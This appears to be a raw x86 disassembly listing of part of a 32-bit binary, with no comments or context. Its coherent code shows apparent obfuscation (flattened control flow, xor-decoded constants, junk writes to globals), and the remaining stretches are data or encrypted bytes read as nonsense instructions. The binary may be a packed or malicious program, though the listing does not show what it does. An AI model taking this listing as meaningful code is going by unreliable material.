  40e1dd:	std    
  40e1de:	or     ecx,DWORD PTR [ebx+0x3e]
  40e1e1:	mov    ds:0x2fbbc5f3,al
  40e1e6:	add    BYTE PTR [ebp-0x1349069b],ch
  40e1ec:	dec    edx
  40e1ed:	test   eax,0xc078a513
  40e1f2:	js     0x40e25a
  40e1f4:	lock and eax,0xa9dae382
  40e1fa:	stc    
  40e1fb:	or     al,0x95
  40e1fd:	sub    al,0xc3
  40e1ff:	sbb    ebp,DWORD PTR [edi-0x39]
  40e202:	jns    0x40e24c
  40e204:	sub    al,0xfd
  40e206:	shl    BYTE PTR [edi-0x7b],1
  40e209:	sti    
  40e20a:	daa    
  40e20b:	inc    edx
  40e20c:	xor    al,0x82
  40e20e:	mov    ah,0x50
  40e210:	mov    al,ds:0xed53d179
  40e215:	ret    0xf667
  40e218:	shl    DWORD PTR [edx+0x46773f42],1
  40e21e:	ds dec esp
  40e220:	xor    DWORD PTR [ecx],esi
  40e222:	lds    edx,FWORD PTR [esi+0x52c52cda]
  40e228:	in     al,dx
  40e229:	mov    bh,0xf
  40e22b:	mov    dh,0xe7
  40e22d:	mov    eax,ds:0xc9af89e2
  40e232:	push   ss
  40e233:	push   eax
  40e234:	add    BYTE PTR [ebx-0x41],ah
  40e237:	stos   BYTE PTR es:[edi],al
  40e238:	push   ss
  40e239:	jl     0x40e1ee
  40e23b:	sti    
  40e23c:	cli    
  40e23d:	jmp    0x53cb:0xb04fdc97
  40e244:	adc    eax,DWORD PTR [edi+ebp*8]
  40e247:	mov    dl,0x76
  40e249:	mov    ebp,0x20359fe3
  40e24e:	js     0x40e1f1
  40e250:	in     eax,0x6a
  40e252:	jmp    0x40e299
  40e254:	pop    es
  40e255:	in     eax,dx
  40e256:	xchg   esp,eax
  40e257:	and    al,0xf3
  40e259:	jo     0x40e23b
  40e25b:	mov    edx,0x4e6ce2bf
  40e260:	fsub   st(1),st
  40e262:	mov    edi,0x114d37f1
  40e267:	cmc    
  40e268:	cmp    al,0xfc
  40e26a:	mov    ds:0x4a8fc0a7,al
  40e26f:	into   
  40e270:	mov    edx,0xf5650ffa
  40e275:	inc    esi
  40e276:	sbb    DWORD PTR [esi],edi
  40e278:	enter  0x69ae,0x85
  40e27c:	adc    DWORD PTR [edx],edx
  40e27e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e27f:	stc    
  40e280:	add    DWORD PTR [eax],ebx
  40e282:	mov    DWORD PTR [ebp-0x18],eax
  40e285:	mov    edi,DWORD PTR [ebp+0x8]
  40e288:	inc    DWORD PTR ds:0x43360b
  40e28e:	xor    edi,esi
  40e290:	add    DWORD PTR ds:0x4336e3,0x2783
  40e29a:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e2a1:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e2a8:	dec    DWORD PTR ds:0x43372b
  40e2ae:	add    edi,ebx
  40e2b0:	mov    DWORD PTR ds:0x433697,0x5e0d
  40e2ba:	jmp    0x40e83c
  40e2bf:	cmp    edi,0x40
  40e2c2:	jne    0x40e31a
  40e2c8:	movzx  eax,BYTE PTR ds:0x43360b
  40e2cf:	mov    eax,ds:0x4139b4
  40e2d4:	mov    eax,DWORD PTR [eax]
  40e2d6:	mov    DWORD PTR ds:0x4336d7,0x3f94
  40e2e0:	mov    DWORD PTR [ebp-0x14],eax
  40e2e3:	mov    DWORD PTR ds:0x43369f,0x877
  40e2ed:	mov    eax,ds:0x413bbc
  40e2f2:	mov    DWORD PTR ds:0x43361b,0x4b6e
  40e2fc:	mov    eax,DWORD PTR [eax]
  40e2fe:	mov    DWORD PTR ds:0x43371f,0x73ce
  40e308:	mov    DWORD PTR [ebp-0x18],eax
  40e30b:	mov    DWORD PTR ds:0x43372b,0x7077
  40e315:	jmp    0x40e830
  40e31a:	mov    DWORD PTR ds:0x4336df,0xab2
  40e324:	cmp    edi,0x33d
  40e32a:	mov    DWORD PTR ds:0x43371b,0x48b4
  40e334:	jne    0x40e3b3
  40e33a:	xor    DWORD PTR ds:0x4336d7,0x79d9
  40e344:	and    DWORD PTR [ebp+0x8],0x0
  40e348:	mov    eax,DWORD PTR [ebp-0x8]
  40e34b:	add    DWORD PTR ds:0x433653,0x43365f
  40e355:	sub    eax,DWORD PTR [ebp+0x8]
  40e358:	xor    DWORD PTR ds:0x4336a7,0x7a28
  40e362:	push   eax
  40e363:	sbb    DWORD PTR ds:0x4336d3,0x14e6
  40e36d:	mov    eax,DWORD PTR [ebp-0x4]
  40e370:	mov    DWORD PTR ds:0x4336d7,0x5b5
  40e37a:	add    eax,DWORD PTR [ebp+0x8]
  40e37d:	push   eax
  40e37e:	call   0x4032fa
  40e383:	mov    DWORD PTR ds:0x433603,0x5b4b
  40e38d:	inc    DWORD PTR [ebp+0x8]
  40e390:	cmp    DWORD PTR [ebp+0x8],0x52
  40e394:	mov    DWORD PTR ds:0x433603,0x3dd6
  40e39e:	jb     0x40e348
  40e3a4:	mov    DWORD PTR ds:0x433697,0x7cb6
  40e3ae:	jmp    0x40e830
  40e3b3:	mov    DWORD PTR ds:0x433603,0x6b28
  40e3bd:	cmp    edi,0x1a3
  40e3c3:	mov    DWORD PTR ds:0x4336af,0x27e
  40e3cd:	jne    0x40e58c
  40e3d3:	movzx  eax,BYTE PTR ds:0x43372b
  40e3da:	and    DWORD PTR ds:0x43360b,eax
  40e3e0:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40e3e7:	add    DWORD PTR ds:0x433663,0x2f92
  40e3f1:	mov    eax,DWORD PTR [ebp-0x4]
  40e3f4:	mov    DWORD PTR [ebp-0x5c],eax
  40e3f7:	mov    eax,DWORD PTR [ebp-0x8]
  40e3fa:	mov    DWORD PTR [ebp-0x58],eax
  40e3fd:	and    eax,DWORD PTR ds:0x433713
  40e403:	jmp    0x40e53c
  40e408:	test   al,0xb5
  40e40a:	test   al,0xe6
  40e40c:	mov    cl,0xe3
  40e40e:	jo     0x40e481
  40e410:	stc    
  40e411:	ret    0x425b
  40e414:	test   eax,0x1617d950
  40e419:	cwde   
  40e41a:	jle    0x40e49a
  40e41c:	adc    bh,BYTE PTR [edi+0x7e]
  40e41f:	jle    0x40e3be
  40e421:	call   0xbc4a3abb
  40e426:	and    dh,cl
  40e428:	sar    BYTE PTR [ebx],0x53
  40e42b:	sub    ah,al
  40e42d:	inc    edx
  40e42e:	(bad)  
  40e42f:	and    BYTE PTR [edx+0x6c025889],dh
  40e435:	jo     0x40e471
  40e437:	std    
  40e438:	loope  0x40e3c6
  40e43a:	adc    al,0x1e
  40e43c:	fist   DWORD PTR [esi]
  40e43e:	jle    0x40e42b
  40e440:	repnz not ebp
  40e443:	div    DWORD PTR [edx-0x46fe1ff1]
  40e449:	(bad)  
  40e44a:	jne    0x40e423
  40e44c:	shl    DWORD PTR [ebp*8-0x8402b46],0xe6
  40e454:	popf   
  40e455:	sub    bh,BYTE PTR [eax]
  40e457:	cli    
  40e458:	sbb    esp,DWORD PTR [ebx-0x17]
  40e45b:	in     eax,dx
  40e45c:	sbb    al,0x56
  40e45e:	popf   
  40e45f:	pop    es
  40e460:	or     ah,bh
  40e462:	es push eax
  40e464:	push   es
  40e465:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e466:	sbb    dh,dl
  40e468:	jns    0x40e480
  40e46a:	pop    ss
  40e46b:	cmc    
  40e46c:	sahf   
  40e46d:	xchg   ebp,eax
  40e46e:	retf   0x6ed4
  40e471:	das    
  40e472:	icebp  
  40e473:	sahf   
  40e474:	and    al,0x49
  40e476:	dec    eax
  40e477:	sahf   
  40e478:	mov    BYTE PTR [ecx-0x2a],cl
  40e47b:	mov    ebx,0xe75b2910
  40e480:	rol    eax,0xd
  40e483:	mov    ebp,edi
  40e485:	lahf   
  40e486:	cwde   
  40e487:	test   eax,0x7c00ce5b
  40e48c:	test   eax,0x2be52f8a
  40e491:	add    al,0x18
  40e493:	clc    
  40e494:	into   
  40e495:	ds inc ecx
  40e497:	rcr    DWORD PTR [ebp+0x1b],1
  40e49a:	pop    ebp
  40e49b:	ins    DWORD PTR es:[edi],dx
  40e49c:	mov    dl,0x7d
  40e49e:	mov    al,0x71
  40e4a0:	jl     0x40e468
  40e4a2:	js     0x40e452
  40e4a4:	xlat   BYTE PTR ds:[ebx]
  40e4a5:	in     eax,dx
  40e4a6:	sbb    DWORD PTR [edi+0x9],eax
  40e4a9:	cmp    ebx,esp
  40e4ab:	daa    
  40e4ac:	mov    eax,esi
  40e4ae:	cs int3 
  40e4b0:	stos   BYTE PTR es:[edi],al
  40e4b1:	sub    eax,0x16c92249
  40e4b6:	cmc    
  40e4b7:	pop    eax
  40e4b8:	jae    0x40e4a5
  40e4ba:	repnz mov dl,0x47
  40e4bd:	mov    BYTE PTR [esi+edx*1+0xfa0f19c],dl
  40e4c4:	cmp    eax,0x79d12e61
  40e4c9:	or     ebx,DWORD PTR [esi-0x72]
  40e4cc:	or     eax,0x80f1494b
  40e4d1:	bound  ebp,QWORD PTR [ebx+0x62943e3d]
  40e4d7:	push   ebx
  40e4d8:	icebp  
  40e4d9:	pop    ss
  40e4da:	pushf  
  40e4db:	jmp    0x40e4b1
  40e4dd:	cmp    eax,0x30326f0
  40e4e2:	and    bl,ah
  40e4e4:	xor    eax,0x29f5a5cc
  40e4e9:	rcr    edi,0x5e
  40e4ec:	call   DWORD PTR [ecx]
  40e4ee:	fcmovb st,st(2)
  40e4f0:	add    BYTE PTR [ebx+0x7ec8b3fe],al
  40e4f6:	dec    edi
  40e4f7:	pop    ss
  40e4f8:	mov    fs,WORD PTR [ecx+0x44ae1146]
  40e4fe:	push   es
  40e4ff:	pushf  
  40e500:	xor    BYTE PTR [ebx],dh
  40e502:	push   ebx
  40e503:	and    DWORD PTR [ebp-0x76],ebx
  40e506:	fiadd  WORD PTR [ebp+0x27]
  40e509:	bound  eax,QWORD PTR [edi+0x47]
  40e50c:	cmp    DWORD PTR [ecx-0x76897537],esp
  40e512:	test   eax,0xf8d4c439
  40e517:	sub    al,0x9a
  40e519:	jns    0x40e51b
  40e51b:	jecxz  0x40e51b
  40e51d:	ss imul ebp,ebx,0x25
  40e521:	add    eax,0xc1d6594d
  40e526:	aaa    
  40e527:	mov    al,ds:0x1be504d5
  40e52c:	cdq    
  40e52d:	add    al,BYTE PTR [ebx+0x34]
  40e530:	(bad)  
  40e531:	rol    ch,1
  40e533:	jbe    0x40e5a7
  40e535:	sbb    eax,0x5f83905b
  40e53a:	sub    al,BYTE PTR [edx-0x75]
  40e53d:	inc    ebp
  40e53e:	hlt    
  40e53f:	or     DWORD PTR ds:0x4336a3,0x4336eb
  40e549:	xor    eax,esi
  40e54b:	add    eax,ebx
  40e54d:	sbb    DWORD PTR ds:0x4336db,0x4336af
  40e557:	mov    DWORD PTR [ebp-0x54],eax
  40e55a:	lea    eax,[ebp-0x1c]
  40e55d:	mov    DWORD PTR [ebp-0x50],eax
  40e560:	mov    eax,DWORD PTR [ebp-0x60]
  40e563:	xor    eax,esi
  40e565:	add    eax,ebx
  40e567:	mov    DWORD PTR [ebp-0x60],eax
  40e56a:	lea    eax,[ebp-0x60]
  40e56d:	push   eax
  40e56e:	mov    eax,DWORD PTR [ebp+0xc]
  40e571:	xor    eax,esi
  40e573:	add    eax,ebx
  40e575:	push   eax
  40e576:	mov    eax,ds:0x413b54
  40e57b:	push   0x413aaa
  40e580:	push   DWORD PTR [eax]
  40e582:	call   0x40984d
  40e587:	jmp    0x40e830
  40e58c:	cmp    edi,0x13d
  40e592:	jne    0x40e830
  40e598:	mov    eax,DWORD PTR [ebp-0x10]
  40e59b:	xor    eax,esi
  40e59d:	add    eax,ebx
  40e59f:	mov    DWORD PTR [ebp+0x8],eax
  40e5a2:	jmp    0x40e6db
  40e5a7:	shl    BYTE PTR [eax+eax*8-0xf8f9fd0],0x74
  40e5af:	sub    eax,0x5ef261b8
  40e5b4:	inc    edx
  40e5b5:	cli    
  40e5b6:	sbb    al,0x2a
  40e5b8:	cdq    
  40e5b9:	jle    0x40e639
  40e5bb:	adc    bh,BYTE PTR [edi+0x7e]
  40e5be:	jle    0x40e63d
  40e5c0:	pop    edx
  40e5c1:	cmp    eax,0xd3518a8b
  40e5c6:	mov    ah,BYTE PTR [ecx+ebp*8-0x5c]
  40e5ca:	push   ecx
  40e5cb:	add    DWORD PTR [ebp-0x65],esp
  40e5ce:	scas   eax,DWORD PTR es:[edi]
  40e5cf:	lds    edi,FWORD PTR [ebx]
  40e5d1:	push   0x28
  40e5d3:	or     al,0x7e
  40e5d5:	and    ah,BYTE PTR [esi+0xa4a2a0c]
  40e5db:	stc    
  40e5dc:	and    cl,BYTE PTR [ecx]
  40e5de:	mov    BYTE PTR [edx],dl
  40e5e0:	inc    edi
  40e5e1:	lea    esi,[edx-0x18a21eb9]
  40e5e7:	xchg   ebx,eax
  40e5e8:	adc    BYTE PTR [esi],cl
  40e5ea:	aam    0x45
  40e5ec:	cmp    edx,DWORD PTR [ebx-0x11]
  40e5ef:	sub    dl,ch
  40e5f1:	jae    0x40e64d
  40e5f3:	mov    ds:0x3b5269c5,al
  40e5f8:	dec    esi
  40e5f9:	dec    eax
  40e5fa:	sub    eax,0x880c5fd7
  40e5ff:	adc    DWORD PTR [edx],ebp
  40e601:	pusha  
  40e602:	xchg   ebp,eax
  40e603:	adc    DWORD PTR [esp+ecx*8],eax
  40e606:	lahf   
  40e607:	in     eax,0xdf
  40e609:	jmp    0x953:0xee876eb2
  40e610:	mov    bl,0xda
  40e612:	xchg   DWORD PTR [esi],ebp
  40e614:	xor    BYTE PTR [edx-0x62e9b0fb],0x5d
  40e61b:	or     DWORD PTR [ecx],ebx
  40e61d:	fstp   DWORD PTR [edi]
  40e61f:	push   ecx
  40e620:	in     eax,0xdd
  40e622:	pushf  
  40e623:	mov    ah,al
  40e625:	sub    cl,bl
  40e627:	mov    ah,ah
  40e629:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e62a:	dec    ebx
  40e62b:	mov    eax,ds:0x3f9ee9f7
  40e630:	cmp    BYTE PTR [edi+ebp*1],ch
  40e633:	dec    edx
  40e634:	shl    DWORD PTR [esi+ebx*1],1
  40e637:	cs repnz adc al,0xd1
  40e63b:	xchg   ebx,eax
  40e63c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e63d:	inc    edx
  40e63e:	lods   al,BYTE PTR ds:[esi]
  40e63f:	mov    dh,0xe
  40e641:	adc    al,0x25
  40e643:	mov    ds:0x5eee4db9,eax
  40e648:	jns    0x40e61a
  40e64a:	(bad)  
  40e64b:	sub    ch,BYTE PTR [ebp-0x16]
  40e64e:	ret    
  40e64f:	push   ebp
  40e650:	js     0x40e6a1
  40e652:	fisubr DWORD PTR [edx-0x6f68b1a9]
  40e658:	mov    ebx,0x1fb66349
  40e65d:	push   ecx
  40e65e:	xchg   ebx,eax
  40e65f:	bound  esp,QWORD PTR [ebx-0x47d9d1a1]
  40e665:	sub    bh,BYTE PTR ds:0x5571e788
  40e66b:	mov    dl,0xd4
  40e66d:	mov    edi,0x111b5233
  40e672:	aaa    
  40e673:	add    DWORD PTR [edx-0x40],edx
  40e676:	push   eax
  40e677:	ja     0x40e691
  40e679:	aam    0x83
  40e67b:	sahf   
  40e67c:	and    al,0xd6
  40e67e:	test   al,0xeb
  40e680:	mov    al,0x2f
  40e682:	pop    ecx
  40e683:	in     eax,0xb1
  40e685:	and    dl,BYTE PTR [ebp+0x1c]
  40e688:	sar    DWORD PTR [edx-0xddfb722],0x53
  40e68f:	or     al,0xbf
  40e691:	jno    0x40e70d
  40e693:	out    dx,al
  40e694:	mov    dh,0xff
  40e696:	call   0x6288471a
  40e69b:	imul   esi,ebp,0xab31e96c
  40e6a1:	xor    DWORD PTR [eax+0xd],esi
  40e6a4:	ins    DWORD PTR es:[edi],dx
  40e6a5:	dec    ebp
  40e6a6:	lea    esp,[edx+0x3409ae9f]
  40e6ac:	cwde   
  40e6ad:	popa   
  40e6ae:	jmp    0x40e6c2
  40e6b0:	push   eax
  40e6b1:	shr    dl,0x81
  40e6b4:	(bad)  
  40e6b5:	mov    ecx,0xda0f6da4
  40e6ba:	(bad)  
  40e6bb:	mov    DWORD PTR [ecx+ebx*2-0x1d109d2e],esp
  40e6c2:	push   ds
  40e6c3:	xor    dh,BYTE PTR [ebx+0x1d]
  40e6c6:	adc    BYTE PTR [edx+0x3c],ch
  40e6c9:	cmp    ebx,DWORD PTR [ebp-0x69]
  40e6cc:	inc    eax
  40e6cd:	in     al,dx
  40e6ce:	xchg   BYTE PTR [eax+0x7882d124],ch
  40e6d4:	add    al,0x5
  40e6d6:	mov    esi,0xf60998b5
  40e6db:	mov    eax,ds:0x413b34
  40e6e0:	mov    DWORD PTR [ebp+0x8],eax
  40e6e3:	mov    eax,DWORD PTR [ebp-0x14]
  40e6e6:	jmp    0x40e81f
  40e6eb:	jb     0x40e70f
  40e6ed:	lods   al,BYTE PTR ds:[esi]
  40e6ee:	jmp    0x9bdf:0xa270706c
  40e6f5:	mov    al,BYTE PTR [ecx-0x2778dec2]
  40e6fb:	into   
  40e6fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6fd:	jle    0x40e77d
  40e6ff:	adc    bh,BYTE PTR [edi+0x7e]
  40e702:	jle    0x40e6f5
  40e704:	icebp  
  40e705:	out    0x55,al
  40e707:	push   es
  40e708:	jle    0x40e6e0
  40e70a:	aam    0x2a
  40e70c:	sub    eax,0x8b9828a3
  40e711:	sbb    cl,BYTE PTR [edi+0x2b7e5515]
  40e717:	push   esp
  40e718:	loop   0x40e6c7
  40e71a:	fidivr WORD PTR [ecx+0x15cae6e8]
  40e720:	lahf   
  40e721:	test   eax,0x75521744
  40e726:	(bad)  
  40e727:	adc    BYTE PTR [edx+0x33],bl
  40e72a:	mov    dl,0x4a
  40e72c:	int    0x37
  40e72e:	mov    bh,0x2e
  40e730:	xchg   edx,eax
  40e731:	popa   
  40e732:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e733:	mov    ebp,0xbe6f2fb1
  40e738:	push   eax
  40e739:	inc    ebp
  40e73a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e73b:	repnz repnz xchg ebx,eax
  40e73e:	aam    0x21
  40e740:	sbb    al,0xd3
  40e742:	psrlq  mm5,QWORD PTR gs:[edi-0x1869d1e6]
  40e74a:	add    dh,bl
  40e74c:	push   ss
  40e74d:	ja     0x40e77a
  40e74f:	inc    edx
  40e750:	mov    esi,0xb53b8873
  40e755:	stos   DWORD PTR es:[edi],eax
  40e756:	aad    0x3f
  40e758:	mov    dl,0x81
  40e75a:	popf   
  40e75b:	(bad)  
  40e75d:	mov    ds:0x80bfc2f8,eax
  40e762:	mov    ecx,0x75e94ab7
  40e767:	mov    bl,BYTE PTR [esi+0x50a32327]
  40e76d:	cmp    DWORD PTR [edx],esi
  40e76f:	or     ebp,DWORD PTR [edx+0x7b]
  40e772:	popa   
  40e773:	inc    edi
  40e774:	das    
  40e775:	add    DWORD PTR [edx],esp
  40e777:	dec    ecx
  40e778:	push   ss
  40e779:	mov    eax,0x52ad7bb8
  40e77e:	pop    esi
  40e77f:	adc    BYTE PTR ds:0xa7aab34b,0x38
  40e786:	adc    esi,DWORD PTR [eax+0x6f]
  40e789:	inc    eax
  40e78a:	shl    DWORD PTR [esi-0x18],cl
  40e78d:	in     al,0x48
  40e78f:	jmp    0x3bdb9ec8
  40e794:	cmp    esp,esi
  40e796:	xor    DWORD PTR [ecx+0xa],eax
  40e799:	jmp    0x40e7a0
  40e79b:	xor    BYTE PTR [ebp-0x61],0x79
  40e79f:	dec    edx
  40e7a0:	xchg   ebp,eax
  40e7a1:	or     BYTE PTR [edi],0x57
  40e7a4:	xchg   ebp,eax
  40e7a5:	aas    
  40e7a6:	mov    edx,0x85461e18
  40e7ab:	adc    BYTE PTR [ebp-0x3286290a],bl
  40e7b1:	pop    edx
  40e7b2:	les    esp,FWORD PTR [ebx+0x255cbd59]
  40e7b8:	jns    0x40e77f
  40e7ba:	jnp    0x40e7ef
  40e7bc:	into   
  40e7bd:	mov    DWORD PTR [eax],edi
  40e7bf:	js     0x40e831
  40e7c1:	data16 (bad) 
  40e7c3:	out    0xd,al
  40e7c5:	adc    ebp,DWORD PTR [eax]
  40e7c7:	jle    0x40e7a0
  40e7c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7ca:	cdq    
  40e7cb:	mov    edi,0x3590be55
  40e7d0:	scas   al,BYTE PTR es:[edi]
  40e7d1:	(bad)  
  40e7d2:	retf   0x45de
  40e7d5:	mov    bl,0x2d
  40e7d7:	xor    ebx,DWORD PTR [ecx+eiz*2]
  40e7da:	mov    dl,0x45
  40e7dc:	and    eax,0xe0e4ebf1
  40e7e1:	jg     0x40e833
  40e7e3:	ins    DWORD PTR es:[edi],dx
  40e7e4:	popf   
  40e7e5:	sbb    ah,ch
  40e7e7:	ud0    eax,DWORD PTR [ebx]
  40e7ea:	outs   dx,BYTE PTR ds:[esi]
  40e7eb:	rcl    esi,0xec
  40e7ee:	inc    esp
  40e7ef:	das    
  40e7f0:	push   ecx
  40e7f1:	mov    bh,0x68
  40e7f3:	sub    ebx,DWORD PTR [ecx+eiz*1]
  40e7f6:	pop    ds
  40e7f7:	sar    BYTE PTR [ebx-0x64702ccb],0x7b
  40e7fe:	and    DWORD PTR [edx-0x2],edx
  40e801:	push   edx
  40e802:	sbb    DWORD PTR [ebx],0xffffffab
  40e805:	inc    ebx
  40e806:	add    BYTE PTR [ebp+0x4613f5b2],dh
  40e80c:	sub    eax,0x38a020fc
  40e811:	inc    esi
  40e812:	jge    0x40e7f2
  40e814:	and    edx,DWORD PTR [edi]
  40e816:	aam    0x71
  40e818:	mov    bl,0xe7
  40e81a:	dec    edx
  40e81b:	push   0xffffff99
  40e81d:	enter  0x8982,0x45
  40e821:	cld    
  40e822:	mov    eax,DWORD PTR [ebp-0x4]
  40e825:	push   0x4
  40e827:	pop    ecx
  40e828:	sub    ecx,eax
  40e82a:	add    ecx,DWORD PTR [ebp-0x18]
  40e82d:	mov    DWORD PTR [ebp-0x8],ecx
  40e830:	mov    eax,DWORD PTR [ebp+0xc]
  40e833:	xor    eax,esi
  40e835:	lea    edi,[edi+eax*1+0x32729b]
  40e83c:	cmp    edi,0x50b
  40e842:	jmp    0x40e97b
  40e847:	xor    al,0xd8
  40e849:	xchg   ebx,eax
  40e84a:	das    
  40e84b:	push   ebx
  40e84c:	jne    0x40e7fe
  40e84e:	loope  0x40e887
  40e850:	jecxz  0x40e800
  40e852:	loope  0x40e89b
  40e854:	mov    eax,0xa7e29e61
  40e859:	jle    0x40e8d9
  40e85b:	adc    bh,BYTE PTR [edi+0x7e]
  40e85e:	jle    0x40e7f6
  40e860:	ja     0x40e7f3
  40e862:	repnz dec ebx
  40e864:	push   edi
  40e865:	xor    edx,esi
  40e867:	cs icebp 
  40e869:	cmp    al,0xd2
  40e86b:	pop    eax
  40e86c:	inc    edx
  40e86d:	out    0x3f,al
  40e86f:	lds    eax,FWORD PTR [ebx+0x79]
  40e872:	inc    esi
  40e873:	data16 jg 0x40e8e2
  40e876:	mov    BYTE PTR [ecx+0x40],al
  40e879:	mov    ecx,0x5c52e13e
  40e87e:	adc    ecx,DWORD PTR [eax]
  40e880:	push   ss
  40e881:	sysret 
  40e883:	inc    ebx
  40e884:	pop    es
  40e885:	and    eax,0x64cf6162
  40e88a:	ja     0x40e8c4
  40e88c:	mov    eax,ds:0x4cf92bcf
  40e891:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e892:	xchg   DWORD PTR [ecx-0x6c],eax
  40e895:	inc    ebp
  40e896:	das    
  40e897:	in     al,0x83
  40e899:	loop   0x40e887
  40e89b:	and    dh,ah
  40e89d:	push   edi
  40e89e:	inc    ebp
  40e89f:	or     BYTE PTR [esi+0x557acd7d],bh
  40e8a5:	mov    esi,0x59a451aa
  40e8aa:	imul   edx,ecx,0x279213bd
  40e8b0:	lods   eax,DWORD PTR ds:[esi]
  40e8b1:	push   eax
  40e8b2:	push   edi
  40e8b3:	out    0xe4,eax
  40e8b5:	cmp    eax,0xf3010f8
  40e8ba:	and    DWORD PTR [edi-0x3b],esi
  40e8bd:	dec    esi
  40e8be:	rcr    DWORD PTR [ebx],1
  40e8c0:	push   edi
  40e8c1:	push   ss
  40e8c2:	fild   WORD PTR [edx+0x1]
  40e8c5:	sbb    ecx,DWORD PTR [ebp+0x6f5bd32d]
  40e8cb:	das    
  40e8cc:	pop    ebx
  40e8cd:	lods   eax,DWORD PTR gs:[esi]
  40e8cf:	aaa    
  40e8d0:	fbstp  TBYTE PTR [eax]
  40e8d2:	cmp    ebp,DWORD PTR [ecx+0x1]
  40e8d5:	lahf   
  40e8d6:	jne    0x40e91d
  40e8d8:	ror    BYTE PTR [edi+0x20],0x9
  40e8dc:	dec    ebp
  40e8dd:	pop    ss
  40e8de:	mov    cl,dh
  40e8e0:	sti    
  40e8e1:	jmp    0x40e8a6
  40e8e3:	(bad)  
  40e8e4:	jnp    0x40e911
  40e8e6:	loope  0x40e8c5
  40e8e8:	stc    
  40e8e9:	sbb    DWORD PTR [edx+0x47d359f7],ecx
  40e8ef:	fucomp st(1)
  40e8f1:	cmp    BYTE PTR [ebx],bl
  40e8f3:	(bad)  
  40e8f4:	cmp    al,0xb
  40e8f6:	popa   
  40e8f7:	in     al,dx
  40e8f8:	mov    ds:0x31a82b33,al
  40e8fd:	mov    ch,0xed
  40e8ff:	inc    ebx
  40e900:	in     eax,0x6e
  40e902:	jmp    0x40e8f9
  40e904:	jmp    0x40e8fb
  40e906:	(bad)  
  40e907:	sti    
  40e908:	mov    DWORD PTR [ebp+0x64],esi
  40e90b:	inc    ecx
  40e90c:	and    eax,0xbf5b47cb
  40e911:	sub    dl,BYTE PTR [edi+eax*4+0x29f81661]
  40e918:	sub    BYTE PTR [esi+0x1594d0cd],dl
  40e91e:	xchg   edx,eax
  40e91f:	mov    ebx,0x2dd3063e
  40e924:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e925:	jmp    0x40e97f
  40e927:	cmc    
  40e928:	int3   
  40e929:	push   esi
  40e92a:	and    bh,BYTE PTR cs:[eax]
  40e92d:	dec    ecx
  40e92e:	mov    ss,esi
  40e930:	(bad)  
  40e931:	dec    esp
  40e932:	cdq    
  40e933:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e934:	outs   dx,BYTE PTR ds:[esi]
  40e935:	mov    ah,0x15
  40e937:	or     BYTE PTR [ecx],al
  40e939:	fwait
  40e93a:	inc    edx
  40e93b:	test   eax,0x2003067b
  40e940:	mov    ch,cl
  40e942:	jp     0x40e976
  40e944:	nop
  40e945:	stos   DWORD PTR es:[edi],eax
  40e946:	js     0x40e997
  40e948:	nop    eax
  40e94b:	mov    al,ds:0x552e5f40
  40e950:	lds    ebp,FWORD PTR [esi+ebx*8+0x2d]
  40e954:	pop    edi
  40e955:	inc    ecx
  40e956:	aas    
  40e957:	pop    ebp
  40e958:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e959:	ins    BYTE PTR es:[edi],dx
  40e95a:	mov    edi,0x63da980a
  40e95f:	scas   eax,DWORD PTR es:[edi]
  40e960:	jo     0x40e945
  40e962:	mov    ebx,0xe46a5d6b
  40e967:	gs xchg ebp,eax
  40e969:	bswap  ebx
  40e96b:	add    esp,DWORD PTR [edi]
  40e96d:	loopne 0x40e9b5
  40e96f:	loopne 0x40e9b4
  40e971:	sub    eax,0x2d262926
  40e976:	and    eax,0x9a05032c
  40e97b:	jne    0x40e2bf
  40e981:	mov    eax,DWORD PTR [ebp+0xc]
  40e984:	pop    edi
  40e985:	xor    eax,esi
  40e987:	pop    esi
  40e988:	jmp    0x40eac1
  40e98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e98e:	sbb    bl,dh
  40e990:	loope  0x40ea05
  40e992:	icebp  
  40e993:	mov    ch,0x58
  40e995:	jns    0x40e920
  40e997:	add    eax,0xf3f0a01d
  40e99c:	pop    DWORD PTR [esi+0x127e7ea4]
  40e9a2:	jg     0x40ea22
  40e9a4:	jle    0x40e9a6
  40e9a6:	leave  
  40e9a7:	or     BYTE PTR [ecx],bl
  40e9a9:	lods   al,BYTE PTR ds:[esi]
  40e9aa:	xchg   ebx,eax
  40e9ab:	or     esp,esp
  40e9ad:	popa   
  40e9ae:	sbb    BYTE PTR [esi+edi*2-0x3f],0x81
  40e9b3:	rcl    BYTE PTR [eax+0xe],1
  40e9b6:	(bad)  
  40e9b7:	out    dx,al
  40e9b8:	fcmovu st,st(2)
  40e9ba:	jge    0x40e96c
  40e9bc:	or     ecx,DWORD PTR [edx]
  40e9be:	fimul  DWORD PTR [edx]
  40e9c0:	cmp    DWORD PTR [esi+0x3576016f],esp
  40e9c6:	ret    
  40e9c7:	ss mov eax,0xbc17ce5f
  40e9cd:	(bad)  
  40e9ce:	lock xor esp,DWORD PTR [ecx+0x7a620137]
  40e9d5:	jbe    0x40e9e4
  40e9d7:	fild   WORD PTR [ebx+0x13]
  40e9da:	xchg   ecx,eax
  40e9db:	pop    edx
  40e9dc:	mov    ch,0x37
  40e9de:	add    DWORD PTR [eax],ebp
  40e9e0:	push   ecx
  40e9e1:	push   ss
  40e9e2:	jno    0x40ea31
  40e9e4:	inc    edx
  40e9e5:	shr    ebx,0xcc
  40e9e8:	adc    DWORD PTR [esi*1+0x7cb77cf9],ecx
  40e9ef:	scas   eax,DWORD PTR es:[edi]
  40e9f0:	mov    ecx,0x323fc90d
  40e9f5:	imul   eax,DWORD PTR [esi+0x29],0xffffffe7
  40e9f9:	inc    edi
